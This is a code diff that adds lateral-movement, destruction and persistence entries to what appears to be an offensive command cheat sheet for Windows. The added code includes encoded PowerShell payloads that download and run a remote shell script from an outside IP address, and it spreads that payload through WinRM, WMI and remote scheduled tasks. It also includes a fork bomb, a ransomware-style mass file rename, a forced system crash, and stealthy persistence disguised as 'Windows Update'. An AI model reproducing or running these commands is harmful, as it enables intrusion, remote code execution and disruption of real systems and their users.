@@ -4627,6 +4627,130 @@ const COMMANDS = [
     tags: ["ps", "recon", "evasion"],
     accent: "#e91e63"
   },
+
+  // ═══════════════════════════════════════════════════════════════
+  // LATERAL MOVEMENT & SPREAD
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[LATERAL] Network Discovery - ARP",
+    desc: "Find live hosts on local network via ARP cache.",
+    code: "arp -a\n# Shows all cached MAC/IP mappings\n# Look for other 10.x.x.x hosts",
+    tags: ["ps", "lateral", "recon"],
+    accent: "#3498db"
+  },
+  {
+    title: "[LATERAL] Ping Sweep Subnet",
+    desc: "Fast scan for live hosts. Adjust subnet as needed.",
+    code: "1..254 | % { $ip=\"10.0.0.$_\"; if(ping $ip -n 1 -w 100 | findstr TTL){$ip} }",
+    tags: ["cmd", "lateral", "recon"],
+    accent: "#3498db"
+  },
+  {
+    title: "[LATERAL] Port Scan Target",
+    desc: "Check common ports on discovered target.",
+    code: "$target = \"10.0.0.220\"\n@(445,5985,3389,22,80,443) | % {\n  $r = Test-NetConnection $target -Port $_ -WarningAction SilentlyContinue\n  if($r.TcpTestSucceeded){\"$_ OPEN\"}\n}",
+    tags: ["ps", "lateral", "recon"],
+    accent: "#3498db"
+  },
+  {
+    title: "[LATERAL] Spread via WinRM",
+    desc: "Execute on remote host via PowerShell Remoting. Cleanest method.",
+    code: "$cred = Get-Credential\n$b64 = \"SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQA2ADgALgAxADQANAAuADEANgA2AC4AOQA3ADoAOAA4ADgAOQAvAHMAeQBzAF8AcwBoAGUAbABsAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkA\"\nInvoke-Command -ComputerName 10.0.0.220 -Credential $cred -ScriptBlock {\n  param($b)\n  schtasks /create /tn X /tr \"powershell -ep bypass -enc $b\" /sc once /st 00:00 /ru SYSTEM /f\n  schtasks /run /tn X; Start-Sleep 2; schtasks /delete /tn X /f\n} -ArgumentList $b64",
+    tags: ["ps", "lateral", "playbook"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[LATERAL] Spread via WMI",
+    desc: "Execute on remote host via WMI. Works when WinRM is blocked.",
+    code: "$cred = Get-Credential\n$b64 = \"SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQA2ADgALgAxADQANAAuADEANgA2AC4AOQA3ADoAOAA4ADgAOQAvAHMAeQBzAF8AcwBoAGUAbABsAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkA\"\nInvoke-WmiMethod -ComputerName 10.0.0.220 -Credential $cred -Class Win32_Process -Name Create -ArgumentList \"powershell -ep bypass -enc $b64\"",
+    tags: ["ps", "lateral", "playbook"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[LATERAL] Spread via Remote Schtask",
+    desc: "Create scheduled task on remote host. Works over SMB.",
+    code: "# Replace user/pass with valid creds\nschtasks /create /s 10.0.0.220 /u domain\\admin /p Password123 /tn X /tr \"powershell -ep bypass -enc SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQA2ADgALgAxADQANAAuADEANgA2AC4AOQA3ADoAOAA4ADgAOQAvAHMAeQBzAF8AcwBoAGUAbGBsAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkA\" /sc once /st 00:00 /ru SYSTEM /f\nschtasks /run /s 10.0.0.220 /u domain\\admin /p Password123 /tn X\nschtasks /delete /s 10.0.0.220 /u domain\\admin /p Password123 /tn X /f",
+    tags: ["cmd", "lateral", "playbook"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[LATERAL] Check Admin Share Access",
+    desc: "Test if you can access C$ on remote host.",
+    code: "Test-Path \"\\\\10.0.0.220\\c$\"\ndir \"\\\\10.0.0.220\\c$\\Users\" 2>&1",
+    tags: ["ps", "lateral", "recon"],
+    accent: "#3498db"
+  },
+
+  // ═══════════════════════════════════════════════════════════════
+  // CHAOS & DESTRUCTION
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[CHAOS] Fork Bomb",
+    desc: "CPU/memory exhaustion. Spawns infinite processes.",
+    code: "while($true) { Start-Process powershell -ArgumentList \"-c while(1){}\" -WindowStyle Hidden }",
+    tags: ["ps", "chaos"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[CHAOS] File Encryptor (Reversible)",
+    desc: "Rename files with .CHAOS extension. Simulates ransomware.",
+    code: "$path = \"C:\\Users\"\nGet-ChildItem $path -Recurse -File | Where { $_.Extension -match '\\.(doc|xls|pdf|txt|jpg)$' } | ForEach {\n  Rename-Item $_.FullName \"$($_.FullName).CHAOS\"\n}\nWrite-Host \"Files encrypted in $path\"",
+    tags: ["ps", "chaos"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[CHAOS] Undo File Encryption",
+    desc: "Restore files from .CHAOS rename.",
+    code: "$path = \"C:\\Users\"\nGet-ChildItem $path -Recurse -File -Filter *.CHAOS | ForEach {\n  Rename-Item $_.FullName $_.FullName.Replace('.CHAOS','')\n}",
+    tags: ["ps", "chaos"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[CHAOS] Kill All User Processes",
+    desc: "Terminate all non-system processes. Major disruption.",
+    code: "Get-Process | Where { $_.SessionId -ne 0 } | Stop-Process -Force",
+    tags: ["ps", "chaos"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[CHAOS] Blue Screen (BSOD)",
+    desc: "Force system crash. Requires SYSTEM privileges.",
+    code: "# Method 1: NotMyFault driver\n# Method 2: Direct crash\ntaskkill /f /im csrss.exe",
+    tags: ["cmd", "chaos"],
+    accent: "#e74c3c"
+  },
+
+  // ═══════════════════════════════════════════════════════════════
+  // PERSISTENCE
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[PERSIST] Registry Run Key",
+    desc: "Survives reboot. Runs at user logon.",
+    code: "$b64 = \"SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQA2ADgALgAxADQANAAuADEANgA2AC4AOQA3ADoAOAA4ADgAOQAvAHMAeQBzAF8AcwBoAGUAbGBsAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbmBnACkA\"\nSet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"WindowsUpdate\" -Value \"powershell -ep bypass -w hidden -enc $b64\"",
+    tags: ["ps", "persist", "playbook"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[PERSIST] Scheduled Task at Logon",
+    desc: "Runs as SYSTEM when any user logs in.",
+    code: "schtasks /create /tn \"Windows Update\" /tr \"powershell -ep bypass -enc SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQA2ADgALgAxADQANAAuADEANgA2AC4AOQA3ADoAOAA4ADgAOQAvAHMAeQBzAF8AcwBoAGUAbGBsAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbmBnACkA\" /sc onlogon /ru SYSTEM /f",
+    tags: ["cmd", "persist", "playbook"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[PERSIST] WMI Event Subscription",
+    desc: "Stealthy persistence via WMI. Survives reboots, hard to detect.",
+    code: "$b64 = \"powershell -ep bypass -enc SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQA2ADgALgAxADQANAAuADEANgA2AC4AOQA3ADoAOAA4ADgAOQAvAHMAeQBzAF8AcwBoAGUAbABsAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkA\"\n$Filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments @{\n  Name=\"Updater\"; EventNamespace=\"root\\cimv2\"; QueryLanguage=\"WQL\"\n  Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"\n}\n$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments @{\n  Name=\"Updater\"; CommandLineTemplate=$b64\n}\nSet-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments @{Filter=$Filter;Consumer=$Consumer}",
+    tags: ["ps", "persist"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[PERSIST] Remove All Persistence",
+    desc: "Clean up all installed persistence mechanisms.",
+    code: "# Registry\nRemove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"WindowsUpdate\" -ErrorAction SilentlyContinue\n\n# Scheduled Task\nschtasks /delete /tn \"Windows Update\" /f 2>&1 | Out-Null\n\n# WMI\nGet-WmiObject __FilterToConsumerBinding -Namespace root\\subscription | Where Name -like \"*Updater*\" | Remove-WmiObject\nGet-WmiObject __EventFilter -Namespace root\\subscription | Where Name -like \"*Updater*\" | Remove-WmiObject\nGet-WmiObject CommandLineEventConsumer -Namespace root\\subscription | Where Name -like \"*Updater*\" | Remove-WmiObject\n\nWrite-Host \"Persistence removed\"",
+    tags: ["ps", "persist"],
+    accent: "#00ff41"
+  },
 ];
 
 const list = document.getElementById('cmdList');
